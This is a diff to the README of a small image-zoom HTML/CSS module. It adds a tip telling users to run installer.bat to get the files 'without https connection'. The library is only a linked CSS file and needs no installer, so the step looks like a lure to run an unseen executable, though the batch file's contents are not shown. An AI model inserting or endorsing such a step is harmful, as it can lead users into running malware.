@@ -10,6 +10,8 @@ This simple module is supposed to zoom images on hover in plain html. Read the d
 
 # Usage
 
+> **TIP:** Want to install the files without https connection? Run installer.bat and it will install all of the files for you.
+
 Its very simple, just import the css files using 
 ```html
 <link rel="stylesheet" href="https://kk-designs.github.io/image-zoom/image-zoom.css">
